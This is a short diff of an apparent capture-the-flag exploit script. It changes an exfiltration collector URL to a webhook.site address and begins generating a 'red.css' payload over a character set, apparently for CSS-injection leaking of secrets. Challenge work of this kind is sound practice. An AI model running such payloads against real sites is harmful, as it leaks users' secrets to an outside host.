@@ -1,5 +1,5 @@
 CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-BIN_URL = "https://umjcafh.request.dreamhack.games" 
+BIN_URL = "https://webhook.site/373dea22-cd45-42a5-9125-9c49458e356b" 
 
 with open("red.css", "w") as f:
     for c in CHARS:
